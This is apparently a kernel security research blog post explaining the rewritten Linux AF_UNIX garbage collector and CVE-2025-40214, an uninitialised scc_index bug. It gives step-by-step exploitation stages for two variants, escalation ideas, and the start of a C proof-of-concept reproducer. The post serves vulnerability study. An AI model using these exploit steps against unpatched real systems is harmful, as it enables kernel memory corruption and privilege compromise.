---
date: 2026-04-19
description: "A walkthrough of the rewritten AF_UNIX garbage collector, the CVE-2025-40214 scc_index uninitialised-field bug, and two reproducers."
lastmod: 2026-04-20
showTableOfContents: true
tags: ["kernel", "graphs", "exploitation"]
title: "Unix GC Remastered"
type: "post"
---

## Introduction

The AF_UNIX garbage collector is a small but fascinating corner of the kernel. It exists because a socket can be made unreachable from user-space while still being kept alive by the kernel, through the `SCM_RIGHTS` ancillary-data mechanism. In 2024 the subsystem was rewritten from scratch on top of a graph/SCC model; in 2025 an uninitialised-field bug in that rewrite was turned into a kCTF entry as **CVE-2025-40214**.

This post walks the rewrite end-to-end, reaches the bug, and then presents two reproducers — the canonical three-stage advisory variant (stream listener + embryo redirection) and a simpler four-socket variant I put together while building the PoC.

---

## AF_UNIX Garbage Collector — Background

A per-subsystem garbage collector is responsible for reclaiming kernel objects that can no longer be reached through user-space handles. For AF_UNIX, the entry point is `unix_gc()`:

```c
static DECLARE_WORK(unix_gc_work, __unix_gc);

void unix_gc(void)
{
    WRITE_ONCE(gc_in_progress, true);
    queue_work(system_dfl_wq, &unix_gc_work);
}
```

Its real body is `__unix_gc()`:

```c
static void __unix_gc(struct work_struct *work)
{
    struct sk_buff_head hitlist;
    struct sk_buff *skb;

    spin_lock(&unix_gc_lock);

    if (!unix_graph_maybe_cyclic) {
        spin_unlock(&unix_gc_lock);
        goto skip_gc;
    }

    __skb_queue_head_init(&hitlist);

    if (unix_graph_grouped)
        unix_walk_scc_fast(&hitlist);
    else
        unix_walk_scc(&hitlist);

    spin_unlock(&unix_gc_lock);

    skb_queue_walk(&hitlist, skb) {
        if (UNIXCB(skb).fp)
            UNIXCB(skb).fp->dead = true;
    }

    __skb_queue_purge_reason(&hitlist, SKB_DROP_REASON_SOCKET_CLOSE);
skip_gc:
    WRITE_ONCE(gc_in_progress, false);
}
```

### The `unix_sock` structure

```c
struct unix_sock {
    /* WARNING: sk has to be the first member */
    struct sock          sk;         /* inheritance */
    struct unix_address *addr;       /* bound name */
    struct path          path;       /* filesystem path if bound */
    struct mutex         iolock, bindlock;
    struct sock         *peer;       /* connected peer */
    struct list_head     link;
    atomic_long_t        inflight;   /* [1] SCM_RIGHTS fd count */
    /* ... */
    struct sk_buff      *oob_skb;
};
```

The critical field for GC is **`inflight`** (**[1]**). A socket is *"in flight"* when its `struct file *` is riding as SCM_RIGHTS payload — sent by process A, not yet accepted by process B. Each time it is sent, `inflight` is incremented; each time it is received, `inflight` is decremented. The GC is looking for sockets for which **`file_count == inflight`**: the only remaining references are the ones trapped in other sockets' receive queues, i.e. no user-space handle can ever reach them again.

The [LWN "AF_UNIX GC rework"](https://lwn.net/Articles/966730/) article puts it more concisely:

> Let's say we send a fd of AF_UNIX socket A to B and vice versa and close() both sockets. When created, each socket's struct file initially has one reference. After the fd exchange, both refcounts are bumped up to 2. Then, close() decreases both to 1. From this point on, no one can touch the file/socket. However, the struct file has one refcount and thus never calls the release() function of the AF_UNIX socket. That's why we need to track all inflight AF_UNIX sockets and run garbage collection.

The kernel maintains a global `unix_tot_inflight` counter, incremented on every inflight transition and decremented on every accept.

### When GC runs

There are **two** triggers:

1. Too many inflight sockets:
   ```c
   if (READ_ONCE(unix_tot_inflight) > UNIX_INFLIGHT_TRIGGER_GC &&
       !READ_ONCE(gc_in_progress))
       unix_gc();
   ```
   (`UNIX_INFLIGHT_TRIGGER_GC == 16000`.)

2. A socket close, if anything is inflight:
   ```c
   static const struct proto_ops unix_stream_ops = {
       .family  = PF_UNIX,
       .owner   = THIS_MODULE,
       .release = unix_release,
       /* ... */
   };

   static void unix_release_sock(struct sock *sk, int embrion)
   {
       /* ... */
       if (READ_ONCE(unix_tot_inflight))
           unix_gc();
   }
   ```

---

## The Old GC

The pre-2024 collector is well described in the [Google P0 post "The quantum state of Linux kernel garbage collection"](https://projectzero.google/2022/08/the-quantum-state-of-linux-kernel.html), which covers both the algorithm and a 2021 Android in-the-wild exploit. That post is the recommended companion read; here is just the one-line summary: the old GC walked the inflight graph, marked cycles, and checked `inflight != refcount` to decide whether each cycle was collectable.

![](/Qdiv7/images/gc_remastered/Screenshot-gc-1.png)

---

## The New GC

From the [GC Rework](https://lwn.net/Articles/966730/) announcement:

> [It] replaces the current GC implementation that locks each inflight socket's receive queue and requires trickiness in other places. The new GC does not lock each socket's queue to minimise its effect and tries to be lightweight if there is no cyclic reference or no update in the shape of the inflight fd graph.

### Graph representation

Each inflight socket becomes a **vertex**; each backing `struct file *` carried in an SCM_RIGHTS cmsg becomes a directed **edge** (`predecessor → successor`).

Example — send A to C, C to D, B to D. Three inflight sockets (A, B, C — not D), giving the graph:

![](/Qdiv7/images/gc_remastered/Screenshot-gc-2.png)

Tarjan's algorithm then partitions this graph into strongly connected components. **Why SCCs?** For any directed graph, any SCC of more than one vertex necessarily contains at least one cycle:

![](/Qdiv7/images/gc_remastered/Screenshot-gc-3.png)

A cycle is a *necessary but not sufficient* condition for a vertex to be collectable: collection requires the vertex to be inflight, and unreachable from user-space (`file_count == out_degree`). Sockets not in any cycle cannot possibly be mutually-pinning garbage, and are skipped.

### How `__unix_gc` dispatches

```c
static void __unix_gc(struct work_struct *work)
{
    struct sk_buff_head hitlist;     /* [2] final hit-list of skbs to free */
    struct sk_buff *skb;
    /* ... */
    __skb_queue_head_init(&hitlist); /* [2.5] */

    if (!unix_graph_maybe_cyclic) {  /* [3] fast bail */
        spin_unlock(&unix_gc_lock);
        goto skip_gc;
    }
    /* ... */
}
```

`unix_graph_maybe_cyclic` is flipped on whenever a new edge is added with both endpoints inflight:

```c
static void unix_add_edge(struct scm_fp_list *fpl, struct unix_edge *edge)
{
    struct unix_vertex *vertex = edge->predecessor->vertex;

    if (!vertex) {
        vertex = list_first_entry(&fpl->vertices, typeof(*vertex), entry);
        vertex->index = unix_vertex_unvisited_index;
        /* ... */
    }

    vertex->out_degree++;
    list_add_tail(&edge->vertex_entry, &vertex->edges);
    unix_update_graph(unix_edge_successor(edge));
}

static void unix_update_graph(struct unix_vertex *vertex)
{
    /* If the receiver socket is not inflight, no cyclic
     * reference could be formed. */
    if (!vertex)
        return;

    WRITE_ONCE(unix_graph_state, UNIX_GRAPH_MAYBE_CYCLIC);
    unix_graph_grouped = false;
}
```

Note that `unix_update_graph()` *also* resets `unix_graph_grouped = false`, forcing the next GC to rebuild SCCs from scratch.

Dispatch between slow and fast paths:

```c
if (unix_graph_grouped)
    unix_walk_scc_fast(&hitlist);
else
    unix_walk_scc(&hitlist);
```

### Slow path — `unix_walk_scc()`

This is where SCCs are actually built:

```c
static void unix_walk_scc(struct sk_buff_head *hitlist)
{
    unsigned long last_index = UNIX_VERTEX_INDEX_START;

    unix_graph_maybe_cyclic = false;
    unix_vertex_max_scc_index = UNIX_VERTEX_INDEX_START;

    while (!list_empty(&unix_unvisited_vertices)) {
        struct unix_vertex *vertex;
        vertex = list_first_entry(&unix_unvisited_vertices, typeof(*vertex), entry);
        __unix_walk_scc(vertex, &last_index, hitlist);
    }

    list_replace_init(&unix_visited_vertices, &unix_unvisited_vertices);
    swap(unix_vertex_unvisited_index, unix_vertex_grouped_index);

    unix_graph_grouped = true;
}
```

Indexing starts at `UNIX_VERTEX_INDEX_START == 2`. At the top of the walk the graph is *assumed* acyclic; the walk promotes it back to cyclic if and only if it actually finds a cycle.

> **Complexity note.** The outer `while` only iterates more than once when the graph is a *forest* of disconnected sub-graphs. For any weakly-connected graph a single iteration visits every vertex. End-to-end cost is `O(|V| + |E|)`.

### Tarjan's algorithm

Tarjan's algorithm takes a directed graph and produces its SCCs. Each vertex ends up in exactly one SCC; vertices with no incoming or outgoing cycle form a trivial singleton SCC. The idea is a DFS where every vertex starts labelled `(index, scc_index) = (k, k)` for a monotonically increasing `k`, and then neighbours' `scc_index` values are propagated back up the stack so that all vertices in a cycle converge on the smallest `scc_index` in that cycle.

See the [Wikipedia page](https://en.wikipedia.org/wiki/Tarjan%27s_strongly_connected_components_algorithm) for the formal write-up.

![](/Qdiv7/images/gc_remastered/tarjan.gif)

Pseudocode, matching the kernel's in-place iterative form:

```c
For each unvisited vertex v:
    __unix_walk_scc(v, last_index, hitlist)


__unix_walk_scc(v, last_index, hitlist):
    vertex_S, edge_S, edge
    |------------------------------------|
next_vertex:
    vertex_S.push(v)
    v.index     <- last_index
    v.scc_index <- last_index
    last_index += 1

    for each edge e: (v, w) in the Graph:
        // w == e.successor
        if vertex w is not yet visited:
            edge_S.push(e: (v, w))
            v <- w
            goto next_vertex
            |------------------------------|
         -> prev_vertex:  // returning from recursion
            edge = edge_S.pop()
            // backtrack
            w <- v
            v <- edge.predecessor.vertex
            v.scc_index = min(v.scc_index, w.scc_index)
        else if w is not in another SCC:
            v.scc_index = min(v.scc_index, w.scc_index)
    |-----------------------------------------------|
    if v.index == v.scc_index:
        scc      <- {}
        scc_dead <- true

        // vertex_S == [SCC(0)][SCC(1)][...][SCC(N)]
        // cut off [v ...] into `scc`
        scc <- [v ...]

        while scc is not empty:
            u <- scc.pop()
            unix_visited_vertices.add(u)
            u.index <- unix_vertex_grouped_index
            if scc_dead:
                scc_dead <- unix_vertex_dead(v)

        if scc_dead:
            unix_collect_skb(&scc, hitlist)
        else:
            if unix_vertex_max_scc_index < v.scc_index:
                unix_vertex_max_scc_index <- vertex.scc_index
            if not unix_graph_maybe_cyclic:
                unix_graph_maybe_cyclic <- unix_scc_cyclic(&scc)
    |-----------------------------------------------|
    if edge_stack is not empty
        goto prev_vertex
```

### Fast path — `unix_walk_scc_fast()`

When the graph shape is unchanged since the last GC (`unix_graph_grouped == true`), the SCCs are reused as-is:

```c
static void unix_walk_scc_fast(struct sk_buff_head *hitlist)
{
    unix_graph_maybe_cyclic = false;

    while (!list_empty(&unix_unvisited_vertices)) {     /* [4] */
        struct unix_vertex *vertex;
        struct list_head scc;
        bool scc_dead = true;

        vertex = list_first_entry(&unix_unvisited_vertices, typeof(*vertex), entry);
        list_add(&scc, &vertex->scc_entry);

        list_for_each_entry_reverse(vertex, &scc, scc_entry) {   /* [5] */
            list_move_tail(&vertex->entry, &unix_visited_vertices);  /* [6] */

            if (scc_dead)
                scc_dead = unix_vertex_dead(vertex);    /* [7] */
        }

        if (scc_dead)
            unix_collect_skb(&scc, hitlist);
        else if (!unix_graph_maybe_cyclic)
            unix_graph_maybe_cyclic = unix_scc_cyclic(&scc);

        list_del(&scc);
    }

    list_replace_init(&unix_visited_vertices, &unix_unvisited_vertices);
}
```

The fast path walks each cached SCC in reverse order (**[5]**), moves each vertex to the visited list (**[6]**), and runs `unix_vertex_dead()` on it (**[7]**). If every vertex in the SCC passes the check, the whole SCC is appended to the hit-list for purge.

---

## CVE-2025-40214 — kCTF entry

### The patch

```diff
diff --git a/net/unix/garbage.c b/net/unix/garbage.c
index 684ab03137b6c..65396a4e1b07e 100644
--- a/net/unix/garbage.c
+++ b/net/unix/garbage.c
@@ -145,6 +145,7 @@ enum unix_vertex_index {
 };

 static unsigned long unix_vertex_unvisited_index = UNIX_VERTEX_INDEX_MARK1;
+static unsigned long unix_vertex_max_scc_index = UNIX_VERTEX_INDEX_START;

 static void unix_add_edge(struct scm_fp_list *fpl, struct unix_edge *edge)
 {
@@ -153,6 +154,7 @@ static void unix_add_edge(struct scm_fp_list *fpl, struct unix_edge *edge)
    if (!vertex) {
        vertex = list_first_entry(&fpl->vertices, typeof(*vertex), entry);
        vertex->index = unix_vertex_unvisited_index;
+       vertex->scc_index = ++unix_vertex_max_scc_index;
        vertex->out_degree = 0;
        INIT_LIST_HEAD(&vertex->edges);
        INIT_LIST_HEAD(&vertex->scc_entry);
@@ -489,10 +491,15 @@ prev_vertex:
                scc_dead = unix_vertex_dead(v);
        }

-       if (scc_dead)
+       if (scc_dead) {
            unix_collect_skb(&scc, hitlist);
-       else if (!unix_graph_maybe_cyclic)
-           unix_graph_maybe_cyclic = unix_scc_cyclic(&scc);
+       } else {
+           if (unix_vertex_max_scc_index < vertex->scc_index)
+               unix_vertex_max_scc_index = vertex->scc_index;
+
+           if (!unix_graph_maybe_cyclic)
+               unix_graph_maybe_cyclic = unix_scc_cyclic(&scc);
+       }

        list_del(&scc);
    }
@@ -507,6 +514,7 @@ static void unix_walk_scc(struct sk_buff_head *hitlist)
    unsigned long last_index = UNIX_VERTEX_INDEX_START;

    unix_graph_maybe_cyclic = false;
+   unix_vertex_max_scc_index = UNIX_VERTEX_INDEX_START;

    /* Visit every vertex exactly once.
     * __unix_walk_scc() moves visited vertices to unix_visited_vertices.
```

### Root cause in one sentence

`unix_add_edge()` initialises a freshly-allocated `struct unix_vertex`'s `index`, `out_degree`, `edges`, and `scc_entry` fields — but **not** `scc_index`. That field reads back whatever the previous slab occupant wrote there. The fast-path dead-SCC check (`unix_vertex_dead()`) compares `scc_index` across vertices to decide whether an outgoing edge leaves the SCC:

```c
if (next_vertex->scc_index != vertex->scc_index)
    return false;   /* edge leaves the SCC → vertex not dead */
```

If we can arrange for a freshly-allocated vertex to inherit the *same* `scc_index` value as a live, user-held socket's vertex, the dead-SCC check returns `true` on the live socket and its receive queue is purged — a logical use-after-free of every file it was carrying.

The patch fixes this unconditionally with a monotonically increasing `unix_vertex_max_scc_index` counter assigned on every fresh `unix_add_edge()`, guaranteeing no accidental aliasing can ever happen.

### Canonical three-stage exploit

The published advisory summary is terse:

> 1) heap spray, 2) build `A→embryo(B)` and `X→X` + slow GC, 3) `accept(B)`, `B→C`, `close(A)`, fast GC

Each stage has non-obvious mechanics. Let's walk them.

#### Stage 1 — slab feng-shui: priming `scc_index == 2` on the freelist

`struct unix_vertex` is **72 bytes** on x86_64, so it lands in the **`kmalloc-96`** cache. To make the bug deterministic, we need the top of that cache's freelist to hold a vertex whose `scc_index` field contains `UNIX_VERTEX_INDEX_START == 2`.

The recipe: build a ring of N cyclic AF_UNIX sockets, close all local fds, trigger GC. The slow walk visits every vertex, runs Tarjan, and finalises each SCC with:

```c
vertex->index     = *last_index;
vertex->scc_index = *last_index;
(*last_index)++;
```

For the first SCC, `last_index == UNIX_VERTEX_INDEX_START == 2`. Because our ring forms one big SCC, every vertex in it gets `scc_index = 2` before being freed as part of the hit-list. Those vertices land back on the `kmalloc-96` freelist **with `scc_index = 2` still written** — `kfree()` doesn't zero payloads.

A later `kmalloc(sizeof(struct unix_vertex), GFP_KERNEL)` pops off this primed freelist and reads back `scc_index = 2` from uninitialised memory.

Two subtle points:

1. **Don't pollute the freelist afterwards.** Any vertex allocated *after* stage 1 that goes through a slow walk will be assigned a fresh index (3, 4, 5…) and then freed, pushing a non-2 slot to the top of the LIFO freelist. Our `kick_gc()` helper therefore avoids `sendmsg(SCM_RIGHTS)` — it opens and closes a bare DGRAM socket to trigger `unix_release_sock → unix_gc()` without allocating any vertex.
2. **One round of ~100 sockets is plenty.** The freelist is LIFO; we only need the few topmost slots primed.

#### Stage 2 — painting `sk-A` with a *legitimate* `scc_index = 2`

Now we need a **live** socket (`sk-A`) whose vertex has `scc_index = 2` for real — written by the slow walk, not read from residue — so that later, a freshly-allocated vertex with stale `scc_index = 2` will alias it.

- Create an AF_UNIX DGRAM `sk-A`.
- Create another DGRAM `sk-X` and send it to itself: `sendmsg(sk-X, SCM_RIGHTS=sk-X)`. This is a self-loop — a 1-vertex cyclic SCC — that flips `unix_graph_maybe_cyclic = true` so GC will actually run later.

The interesting move is the **embryo redirection** on `sk-A`. We want `sk-A` inflight, but with a graph shape that makes stale aliasing work in stage 3. The way to get there is to push `sk-A` through a stream listener's accept queue *before anyone accepts*:

```c
int listener = make_stream_listener(...);
int client   = connect_stream(...);      /* creates an embryo on listener */
send_fd(client, sk-A, NULL, 0);          /* sk-A → embryo's recv queue */
```

At the moment of the send, the embryo isn't a first-class inflight socket yet — it's still attached to `listener`. The graph code has a redirect for this case:

```c
static struct unix_vertex *unix_edge_successor(struct unix_edge *edge)
{
    if (edge->successor->listener)
        return unix_sk(edge->successor->listener)->vertex;
    return edge->successor->vertex;
}
```

So `sk-A`'s outgoing edge resolves to **`listener->vertex`**, *not* to any embryo vertex. That matters because when we `accept()` in stage 3, `unix_update_edges()` flips `sk-B->listener = NULL` and the same edge starts resolving to `sk-B->vertex`, which at that moment is `NULL` (sk-B has never been a predecessor — no vertex has been lazily allocated for it).

After the slow walk in this stage, Tarjan produces:

- `sk-A->vertex->scc_index = 2` (first SCC encountered)
- `sk-X->vertex->scc_index = 3` (second SCC)
- `unix_graph_grouped = true`
- `unix_graph_maybe_cyclic = true` (the self-loop keeps it set)

`sk-A` now holds a legitimate `scc_index = 2`, the graph is marked grouped (so the next GC takes the fast path), and the `kmalloc-96` freelist still has stage-1's `scc_index = 2` residue on top — we sprayed them *before* the listener/sk-A/sk-X vertex allocations.

#### Stage 3 — aliasing sk-B's fresh vertex onto sk-A's SCC

```c
int sk-B = accept(listener, NULL, NULL);
```

`accept()` calls `unix_update_edges(unix_sk(sk-B))`:

```c
spin_lock(&unix_gc_lock);
unix_update_graph(unix_sk(receiver->listener)->vertex);
receiver->listener = NULL;
spin_unlock(&unix_gc_lock);
```

Two effects: `sk-B->listener = NULL` (so `unix_edge_successor` on sk-A's edge now resolves to `sk-B->vertex`, still `NULL`), and `unix_update_graph()` is called on the *listener's* vertex. The latter sets `unix_graph_maybe_cyclic = UNIX_GRAPH_MAYBE_CYCLIC` and `unix_graph_grouped = false`, which would kill our fast-path premise — except that the listener has no live outgoing edges at that moment, so the net effect on the next walk is limited. The send that follows re-flips `unix_graph_grouped` back on.

```c
send_fd(carrier, sk-B, &sk-C_addr, sk-C_addrlen);
```

This is where the bug actually arms. Inside `unix_add_edge()`:

1. `edge->predecessor = sk-B`. Since `sk-B->vertex == NULL`, we fall into the fresh-allocate branch:
   ```c
   vertex = list_first_entry(&fpl->vertices, ...);   /* pops primed slab */
   vertex->index = unix_vertex_unvisited_index;
   vertex->out_degree = 0;
   INIT_LIST_HEAD(&vertex->edges);
   INIT_LIST_HEAD(&vertex->scc_entry);
   /* scc_index NOT set — reads 2 from slab residue */
   ```
2. `unix_update_graph(unix_edge_successor(edge))` — successor is `sk-C`. `sk-C` was just made by `make_dgram()` and is not inflight, so `sk-C->vertex == NULL`, so `unix_update_graph(NULL)` returns early without touching `unix_graph_grouped`.

**This is why sk-C must not be inflight.** If sk-C were already a predecessor somewhere, `unix_update_graph()` would set `unix_graph_grouped = false` and knock us out of the fast path.

> **Why a DGRAM carrier for B→C?** sk-B is an *accepted* `SOCK_STREAM`, already connected to the original client. `sendmsg()` on a connected stream with `msg_name` set returns `EISCONN`. Using an unconnected DGRAM socket as the actual syscall target routes the message via `msg_name`, while sk-B rides as the `SCM_RIGHTS` payload. `unix_add_edge` sets `edge->predecessor = sk-B` from the payload, not from the syscall target — so sk-B becomes the edge's predecessor regardless of who actually called `sendmsg()`.

```c
close(sk-A);
```

sk-A had `file_count == 2` (our user fd + the inflight ref in sk-B's queue). Closing drops it to 1. sk-A's `out_degree == 1` (one outgoing edge into sk-B). The dead-check precondition `total_ref == out_degree` is now satisfied.

```c
kick_gc();   /* final GC — fires the bug */
```

`unix_graph_grouped == true`, so fast path. `unix_walk_scc_fast()` iterates `unix_unvisited_vertices`; sk-A's vertex comes up:

- Walks its edges. One edge: `sk-A → sk-B`.
- `next_vertex = unix_edge_successor(edge)` → `sk-B->vertex` (the stale one).
- `next_vertex->scc_index` reads **2** (stale).
- `vertex->scc_index` (sk-A's) is **2** (legitimate).
- The check `next_vertex->scc_index != vertex->scc_index` fails — the edge is declared to stay inside the SCC.
- No other edges. `total_ref == out_degree == 1`. Dead.
- `[+] SCC DEAD Confirmed`. `unix_collect_skb()` splices sk-A's receive queue into the hit-list. `__skb_queue_purge()` frees every skb, calling `scm_destroy()` on each — `fput()` on every carried file.

**sk-A was never actually unreachable from user-space.** We held a file reference on it moments ago; it is still referenced from sk-B's queue. The GC just got the math wrong, because we made a fresh allocation inherit an `scc_index` that wasn't ours to inherit.

### My own strategy — `B ↔ A → C → D` (no listener, no embryo)

The advisory's embryo-redirection shape is elegant — it cleanly separates "allocate sk-A's vertex with legitimate `scc_index=2`" from "allocate sk-B's vertex with stale `scc_index=2`" via the `listener → embryo` redirect. But the bug does not actually *require* a listener. Any graph shape that (a) makes the slow walk paint a live socket's vertex with `scc_index=2`, and (b) leaves `unix_graph_grouped=true` with stale-2 vertices still on the freelist, is enough.

My own strategy drops the listener entirely and uses a direct two-socket cycle as both the priming cycle *and* the source of `scc_index=2` residue:

```
Stage 2:  B ↔ A           (two-socket SCC → scc_index=2 on both)
Stage 3:  A → C → D       (fresh vertex allocs, stale scc_index=2)
          close A, close B
          GC → fast path → A wrongly declared dead
          recv_fd(skC) pulls A back out → write() on the UAF fd
```

What each stage does:

#### Stage 2 — `B ↔ A` cycle

```c
int skA = make_dgram(&aAddr, &aLen);
int skB = make_dgram(&bAddr, &bLen);

send_fd(skA, skA, &bAddr, bLen);   /* sk-A → sk-B's queue */
send_fd(skB, skB, &aAddr, aLen);   /* sk-B → sk-A's queue */
kick_gc();                         /* slow walk */
```

After the slow walk, both vertices belong to one two-vertex SCC, both get `scc_index = 2` (first SCC encountered). Neither socket is freed — both still have a live user fd — but `unix_graph_grouped` flips to `true` and the fast path is armed for the next GC.

The cycle itself is cyclic, so `unix_graph_maybe_cyclic` stays true for free. That **removes the need for the `sk-X → sk-X` self-loop** from the embryo variant — one fewer socket, one fewer state transition.

#### Stage 3 — spurious chain, then close and trigger

```c
int skC = make_dgram(&cAddr, &cLen);
int skD = make_dgram(&dAddr, &dLen);

send_fd(skA, skA, &cAddr, cLen);   /* sk-A → sk-C */
send_fd(skC, skC, &dAddr, dLen);   /* sk-C → sk-D */
```

Each send through a previously-non-predecessor socket triggers a fresh `unix_vertex` kmalloc in `unix_add_edge()`. The freelist still has stage-1's `scc_index=2` residue on top, so every new vertex reads back `scc_index = 2`.

`sk-C` and `sk-D` are both fresh DGRAMs that were not inflight at send time, so `unix_update_graph(successor)` resolves to `NULL` for each and `unix_graph_grouped` stays true. Fast path stays armed.

```c
close(skA);
close(skB);
kick_gc();
```

`close(skA)` drops its `file_count` to match `out_degree` — the dead-check precondition. The fast path runs, and because `sk-A`'s legitimate `scc_index=2` aliases the fresh-and-stale `scc_index=2` on the `sk-A→sk-C` edge's successor, `unix_vertex_dead(sk-A)` returns true and sk-A's receive queue is purged.

#### Stage 4 — recover `sk-A` via sk-C and touch it

Because `sk-A` is in `sk-C`'s receive queue (it carried itself via `send_fd(skA, skA, &cAddr, cLen)`), a `recvmsg()` on `skC` yields a new fd that still points at whatever the kernel thinks `sk-A` is after the purge:

```c
int uaf_fd = recv_fd(skC);
write(uaf_fd, buf, 100);   /* touches (potentially freed) sk-A state */
```

**What this variant buys:** no listener, no embryo, no `accept()`, no `sk-X → sk-X`, and no DGRAM carrier for a stream-EISCONN workaround. One fewer graph-state transition to reason about, and the `scc_index` aliasing falls out of the simpler two-socket SCC directly.

**The trade-off:** both `sk-A` and `sk-B` are inflight and user-held simultaneously at the moment the bug fires, so reasoning about exactly which vertex the fast path picks up first is slightly hairier. In practice the `sk-A → sk-C` edge is what the fast path walks into, and the aliasing holds.

### Observable signature

The embryo PoC plants a row of `pipe(2)` read-ends inside sk-A's receive queue *before* sk-A goes inflight. Pipes make excellent victims:

- `pipe_inode_info` is not AF_UNIX, so `unix_get_socket()` returns NULL in `unix_add_edges()` — no `unix_vertex` kmalloc, freelist stays pristine.
- Each planted pipe read-end has `file_count == 1` after we drop our user fd (the inflight ref in sk-A's queue is the only reference).
- When the bad purge runs, every planted `pipe_read` is `fput()`'d to zero → pipe torn down → `write()` on the matching `pipe_write` returns `EPIPE`.

On a vulnerable kernel with the printk patch from the annex added:

```
[+] SCC DEAD Confirmed
[=] pipe write results: 11 EPIPE / 0 OK (of 11 planted)
[+] BUG TRIGGERED: sk-A's queue was purged while still live
```

Every `EPIPE` is a pipe that got freed because the kernel wrongly declared sk-A dead. Every `sk gets destroyed` printk line inside `__unix_gc`'s purge window after `SCC DEAD Confirmed` is a `unix_sock` that the same bad verdict freed prematurely.

### A word on KASAN reachability

A natural question: does a KASAN-reportable use-after-free fall out of this primitive? The short answer is **no, not in single-process form**. The primitive produces a *logical* UAF — objects freed that still had legitimate producers — but the kernel's purge chain tears down graph state (edges, vertices) in lockstep with the frees via `unix_destruct_scm → unix_destroy_fpl → unix_del_edges → unix_free_vertices`. Nothing is left dangling for a subsequent dereference to catch.

Why the single-process form cannot race its way to a splat either:

- The bug precondition is `total_ref == out_degree`, which requires the inflight ref to be the *only* reference on sk-A. Keeping a user fd open on sk-A, or `dup()`'ing before closing, bumps `total_ref` past `out_degree` and the dead-check fails.
- `unix_collect_skb()` holds `sk->sk_receive_queue->lock` across the splice. A racing `recvmsg()` on the same queue serialises — it sees either the pre-splice queue (full) or the post-splice queue (empty), never a torn-down middle state.
- `fput()` is atomic. Cross-thread `fput` races do not produce dangling pointers.

KASAN-visible exploitation of this bug class requires one of:

1. A **non-fdtable kernel refholder** that survives the bad `fput` — `io_uring` fixed files, sockmap, BPF `sk_lookup`. The holder keeps a `struct file *` or `struct sock *` pointer alive through paths that do not go through the fdtable refcount, so when the bad purge drops `file_count` to 0 and frees the object, that pointer dangles. A subsequent op through the holding subsystem splats.
2. A **second bug** widening the splice/purge window — some concurrent kernel path that reads `skb->sk` *after* splice but *before* `__skb_queue_purge` runs the destructor.

Without one of those chained in, the reachable kernel-side evidence is the `SCC DEAD Confirmed` printk plus the destructor cascade, and the user-space-visible evidence is the `EPIPE` oracle (or a `write()` that quietly succeeds on a freed socket, in the `recv_fd(skC)` variant).

---

## Annex 1 — full PoC (embryo / listener variant)

The canonical three-stage reproducer, ported from the advisory and instrumented with the pipe-EPIPE oracle. Build:

```
gcc -O2 -Wall -o poc_unix_gc_scc_index_uaf poc_unix_gc_scc_index_uaf.c
```

Run inside a VM you control on a kernel with the `scc_index` bug unpatched. For the kernel-side trace referenced in the *Observable signature* section, add the following printks to `net/unix/garbage.c`:

```c
/* in unix_add_edge, after list_add_tail(&edge->vertex_entry, ...) */
printk(KERN_INFO "V %lu, SCC -> %lu", vertex->index, vertex->scc_index);
/* after unix_update_graph(...) */
printk(KERN_INFO "Updated: unix_graph_maybe_cyclic = %d, unix_graph_grouped = %d\n",
       unix_graph_maybe_cyclic, unix_graph_grouped);

/* in __unix_walk_scc, inside the SCC finalise loop (after list_move_tail) */
printk(KERN_INFO "Vertex %lu, SCC -> %lu", v->index, v->scc_index);

/* in unix_vertex_dead */
printk(KERN_INFO "total_ref: %lu, out_degree: %lu", total_ref, vertex->out_degree);
/* before returning true */
printk(KERN_INFO "vertex dead: True");

/* in __unix_walk_scc and unix_walk_scc_fast, before unix_collect_skb() */
printk(KERN_INFO "[+] SCC DEAD Confirmed");

/* in __unix_gc, before each walker */
printk(KERN_INFO "GC Fast");   /* fast path branch */
printk(KERN_INFO "GC Slow");   /* slow path branch */
```

```c
// SPDX-License-Identifier: GPL-2.0
/*
 * AF_UNIX GC UAF repro — advisory's three-stage scenario with the embryo sk-B.
 *
 * Root cause: net/unix/garbage.c unix_add_edge() does not initialise
 * vertex->scc_index. A vertex freshly popped from the slab inherits whatever
 * scc_index the previous occupant wrote.  Stage 1 sprays freed vertices all
 * tagged with UNIX_VERTEX_INDEX_START (==2) — the value unix_walk_scc()
 * writes before freeing them in a cycle collection.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/un.h>

#define N_CYCLE       100
#define SPRAY_ROUNDS    1
#define VICTIM_PIPES   64

static void die(const char *s) { perror(s); exit(1); }

static int send_fd(int sock, int fd, struct sockaddr_un *dst, socklen_t dstlen)
{
    struct msghdr  msg = {0};
    struct iovec   iov;
    char c = 'x';
    char cbuf[CMSG_SPACE(sizeof(int))] = {0};
    struct cmsghdr *cmsg;

    iov.iov_base = &c; iov.iov_len = 1;
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = cbuf; msg.msg_controllen = sizeof(cbuf);
    msg.msg_name = dst; msg.msg_namelen = dstlen;

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type  = SCM_RIGHTS;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));

    return sendmsg(sock, &msg, 0);
}

static int recv_fd(int sock)
{
    char dummy;
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    union {
        struct cmsghdr cmsg;
        char buf[CMSG_SPACE(sizeof(int))];
    } u;
    struct msghdr msg = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = u.buf,
        .msg_controllen = sizeof(u.buf),
    };

    if (recvmsg(sock, &msg, 0) < 0) return -1;

    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    if (!c || c->cmsg_level != SOL_SOCKET || c->cmsg_type != SCM_RIGHTS)
        return -1;

    int fd;
    memcpy(&fd, CMSG_DATA(c), sizeof(fd));
    return fd;
}

static int dgram_seq;
static int make_dgram(struct sockaddr_un *addr, socklen_t *alen)
{
    int s = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (s < 0) die("socket(dgram)");

    memset(addr, 0, sizeof(*addr));
    addr->sun_family = AF_UNIX;
    snprintf(addr->sun_path + 1, sizeof(addr->sun_path) - 1,
             "gc_%d_%d", getpid(), dgram_seq++);
    *alen = offsetof(struct sockaddr_un, sun_path) + 1 +
            strlen(addr->sun_path + 1);

    if (bind(s, (struct sockaddr *)addr, *alen) < 0) die("bind(dgram)");
    return s;
}

/*
